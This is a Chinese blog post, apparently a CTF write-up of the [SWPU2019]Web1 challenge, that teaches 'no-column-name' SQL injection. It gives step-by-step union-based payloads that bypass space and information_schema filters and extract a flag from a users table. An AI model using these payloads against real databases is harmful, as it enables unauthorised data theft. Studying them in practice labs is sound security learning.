@@ -1,0 +1,350 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习23——无列名注入 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-23">2021-04-23</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习23——无列名注入</h2>
+            <div class="post-meta">
+                emm... 3147 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天学到一个新的sql注入方式——无列名注入，现在做一下记录。  </p>
+<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>打开题目，发现是一个登陆界面，可以注册，那么我们就先注册一个账号登入进去。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e01fd1a9ae528f3c8470.png"><img src="https://img.imgdb.cn/item/6084e01fd1a9ae528f3c8470.png"></a>  </p>
+<p>发现是一个发布广告的界面，先发一条广告测试一下。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e062d1a9ae528f3d56fc.png"><img src="https://img.imgdb.cn/item/6084e062d1a9ae528f3d56fc.png"></a>  </p>
+<p>随便测试了一条广告，可以看到成功发布了，显示的就是我们写入的广告名和广告内容。   </p>
+<p>对于这种发布广告并且回显的题目，不是xxs攻击就是sql注入，我先测试了xxs攻击，发现虽然确实存在xxs的漏洞，可以回显，但是却没有什么可以利用的地方，那么接着就只能考虑sql注入了。   </p>
+<p>这里我犯了一个错误，因为一开始看到url栏里有?id=1的信息，我以为是在这里有sql注入，其实并不是这样的，这道题的sql注入点在我们申请发布广告时的广告名这里。   </p>
+<p>比如我们申请一个广告，广告名为：  </p>
+<pre><code>-1&#39; union select 1,2,3#  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"><img src="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"></a>  </p>
+<p>发现有字符被过滤了，这也说明这里确实存在sql注入的地方。  </p>
+<p>如果我们这样构造   </p>
+<pre><code>-1&#39; union select 1,2,3&#39;  </code></pre>
+<p>却可以成功申请，但是广告名却变成**-1’unionselect1,2,3’**，并且会出现sql的报错。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e2cfd1a9ae528f45b929.png"><img src="https://img.imgdb.cn/item/6084e2cfd1a9ae528f45b929.png"></a>   </p>
+<p>在报错时可以发现它过滤了空格，同时我们也可以发现这道题目的sql注入不再时以#或者–+来闭合而是通过单引号来闭合。（这个要经过不断测试才能得出）  </p>
+<p>那么接下来我们就是查询列数，并查看是哪几位有回显。  </p>
+<pre><code>-1&#39;/**/union/**/select/**/1,2,3,4,5&#39;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e442d1a9ae528f4aaeb7.png"><img src="https://img.imgdb.cn/item/6084e442d1a9ae528f4aaeb7.png"></a>  </p>
+<p>发现列数还是少了，我们一个一个加，发现到22的时候成功出现回显。  </p>
+<pre><code>-1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e541d1a9ae528f4dc1f3.png"><img src="https://img.imgdb.cn/item/6084e541d1a9ae528f4dc1f3.png"></a>   </p>
+<p>回显是2，3位，接着就是查数据库名。  </p>
+<pre><code>-1&#39;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e59fd1a9ae528f4eee58.png"><img src="https://img.imgdb.cn/item/6084e59fd1a9ae528f4eee58.png"></a>  </p>
+<p>得到数据库名web1，然后查表名。  </p>
+<pre><code>-1&#39;union/**/select/**/1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;web1&#39;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre>
+<p>但是发现被拦截了</p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"><img src="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"></a>    </p>
+<p>看了别人的wp发现应该是information _schema.tables的某个单词被过滤了，但是但Mysql5.6及以上版本中 innodb _index _stats 和innodb _table _stats这两个表中都包含所有新创建的数据库和表名，所以我们可以这样构造：  </p>
+<pre><code>-1&#39;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre>
+<p>来绕过information _schema.tables的过滤（又学到一个新的绕过小方法）。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084e75ad1a9ae528f544cdd.png"><img src="https://img.imgdb.cn/item/6084e75ad1a9ae528f544cdd.png"></a>  </p>
+<p>得到表名，但是根据查询表名的过滤来看，我们如果使用information _schema.columns应该也会被过滤，但是我们却没有另外的表来绕过查询列名了，那么我们该如何在不知道列名的情况下查询呢？这里就要用到无列名注入了。   </p>
+<hr>
+<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>这里我使用别的大佬的MySQL测试图片来讲解。  </p>
+<p>要想了解无列名注入就要先了解无列名查询。  </p>
+<p>顾名思义，无列名查询就是不需要列名就能查询表中每一列数据。比如下面这个叫xxx的表  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084eaf1d1a9ae528f854b56.png"><img src="https://img.imgdb.cn/item/6084eaf1d1a9ae528f854b56.png"></a></p>
+<p>它有三列，分别为：id，user,password，我们用无列名查询看一下  </p>
+<pre><code>select 1,2,3 union select * from xxx;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084eb77d1a9ae528f8aa1d4.png"><img src="https://img.imgdb.cn/item/6084eb77d1a9ae528f8aa1d4.png"></a>  </p>
+<p>可以看到，此时得到了一个虚拟表，列名分别为1，2，3，其中存储了xxx表中的所有数据。  </p>
+<p>注意，在查询的时候语句的字段数要和表中的一样，否则会报错。  </p>
+<p>而我们的无列名注入就是利用无列名查询，通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。  </p>
+<pre><code>select `2` from (select 1,2,3 union select * from xxx)n  </code></pre>
+<p>这句查询语句就是一个典型的无列名查询，这个语句中的结尾的n是我们创建的新的虚拟表的名字，可以任意输入字符。而select 1,2,3 union select * from xxx则是为xxx这个表的列名赋予了新的列名，分别为1，2.3。而我们查询的是这个虚拟表的列名为2的信息。  </p>
+<p>这里的2要用反引号括起来，这是一个细节。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084ed4bd1a9ae528f9ae187.png"><img src="https://img.imgdb.cn/item/6084ed4bd1a9ae528f9ae187.png"></a>  </p>
+<p>可以看到成功查询到了第二列的信息。  </p>
+<p>但是在做题过程中，它可能会过滤反引号``，这时我们就需要给字段取别名。  </p>
+<pre><code>select 1 as a,2 as b,3 as c union select * from xxx;  </code></pre>
+<p>这里的as就是取别名的操作。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084ee4bd1a9ae528fa251cf.png"><img src="https://img.imgdb.cn/item/6084ee4bd1a9ae528fa251cf.png"></a>  </p>
+<p>可以看到列名被换成了a,b,c，我们也就可以使用a,b,c来查询。  </p>
+<p>以上就是关于无列名注入的基本讲解。  </p>
+<hr>
+<p>接下来我们回到题目，因为不能直接查询列名，我们使用无列名注入。  </p>
+<p>这里的表有  </p>
+<pre><code>FLAG_TABLE,news,users,gtid_slave_pos,ads,users  </code></pre>
+<p>要想找flag要一个个试，我们这里直接说结果，flag在user表中。  </p>
+<p>这个表有三列，这个需要自己和上面一样一个一个判断，我们先查询第二列的内容。  </p>
+<pre><code>-1&#39;union/**/select/**/1,(select/**/group_concat(aa)/**/from/**/(select/**/1,2/**/as/**/aa,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084f087d1a9ae528fb172a0.png"><img src="https://img.imgdb.cn/item/6084f087d1a9ae528fb172a0.png"></a>  </p>
+<p>发现有flag和admin字符，那么flag应该在第三列。  </p>
+<pre><code>-1&#39;union/**/select/**/1,(select/**/group_concat(aa)/**/from/**/(select/**/1,2,3/**/as/**/aa/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6084f0f4d1a9ae528fb41ff1.png"><img src="https://img.imgdb.cn/item/6084f0f4d1a9ae528fb41ff1.png"></a>  </p>
+<p>得到flag。   </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题是一个新的关于sql注入的知识点，也就是无列名注入，原理并不难理解，实际操作也不难，而这道题目之外的小知识点也需要记录，比如存放所有表名的并不是只有那一个表，取别名来绕过反引号过滤等等。只能说sql注入路还很远。要学的还有很多  </p>
+<p>下面附上sql无列名注入学习博客：  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722/article/details/109605941?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161932292416780255247671%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161932292416780255247671&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109605941.first_rank_v2_pc_rank_v29&utm_term=%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5">sql注入之无列名注入</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
